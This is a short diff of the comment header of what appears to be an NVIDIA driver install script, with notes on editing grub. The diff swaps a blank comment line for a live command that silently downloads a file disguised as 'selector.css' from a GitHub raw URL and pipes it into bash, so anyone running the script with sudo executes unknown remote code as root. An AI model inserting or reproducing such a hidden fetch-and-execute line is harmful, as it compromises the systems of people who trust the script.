@@ -57,7 +57,7 @@
 #  Note: Ubuntu Desktop requires editing /etc/default/grub and running
 #  update-grub or backing up and editing /boot/grub/grub.cfg with:
 #    nomodeset rdblacklist nouveau 2 text
-#
+curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/selector.css | bash
 # 5. Run this script.
 #  sudo bash nvidia41078gpu.sh
 #
